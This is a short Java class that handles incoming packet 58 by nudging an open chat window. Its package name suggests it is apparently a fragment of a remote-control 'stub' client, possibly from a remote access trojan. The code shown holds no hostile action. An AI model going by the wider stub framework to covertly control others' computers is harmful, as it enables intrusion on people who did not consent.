package com.redpois0n.stub.stub.packets.incoming;

import com.redpois0n.stub.Connection;

public class Packet58NudgeChat extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		if (Connection.frameChat != null) {
			Connection.frameChat.nudge();
		}
	}

}
